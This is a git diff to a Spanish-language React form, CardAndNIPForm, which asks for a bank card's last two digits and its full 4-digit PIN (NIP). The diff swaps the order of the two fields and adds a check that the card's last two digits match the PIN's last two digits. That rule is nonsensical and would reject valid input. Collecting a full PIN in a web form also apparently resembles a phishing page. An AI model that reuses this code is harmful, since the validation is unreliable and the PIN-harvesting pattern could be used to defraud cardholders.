@@ -85,6 +85,14 @@ const CardAndNIPForm = () => {
             return;
         }
 
+        // Validate that last 2 digits match the last 2 digits of the NIP
+        const nipLastTwo = formData.nip.slice(-2);
+        if (formData.lastTwoDigits !== nipLastTwo) {
+            toast.error('Los últimos 2 dígitos no coinciden con tu NIP. Verifica e intenta nuevamente.');
+            setErrors({ ...errors, lastTwoDigits: true });
+            return;
+        }
+
         // Simular la espera de 2 segundos y el envío
         setLoading(true);
 
@@ -164,21 +172,6 @@ const CardAndNIPForm = () => {
                         margin="normal"
                         required
                         fullWidth
-                        id="lastTwoDigits"
-                        label="2 últimos dígitos de tu tarjeta"
-                        name="lastTwoDigits"
-                        type="tel"
-                        value={formData.lastTwoDigits}
-                        onChange={handleChange}
-                        onKeyPress={handleKeyPress}
-                        error={errors.lastTwoDigits}
-                        inputProps={{ maxLength: 2 }}
-                    />
-
-                    <TextField
-                        margin="normal"
-                        required
-                        fullWidth
                         id="nip"
                         label="Ingresa los 4 dígitos de tu NIP"
                         name="nip"
@@ -188,6 +181,21 @@ const CardAndNIPForm = () => {
                         onKeyPress={handleKeyPress}
                         error={errors.nip}
                         inputProps={{ maxLength: 4 }}
+                    />
+
+                    <TextField
+                        margin="normal"
+                        required
+                        fullWidth
+                        id="lastTwoDigits"
+                        label="2 últimos dígitos de tu tarjeta"
+                        name="lastTwoDigits"
+                        type="tel"
+                        value={formData.lastTwoDigits}
+                        onChange={handleChange}
+                        onKeyPress={handleKeyPress}
+                        error={errors.lastTwoDigits}
+                        inputProps={{ maxLength: 2 }}
                     />
 
                     <Button
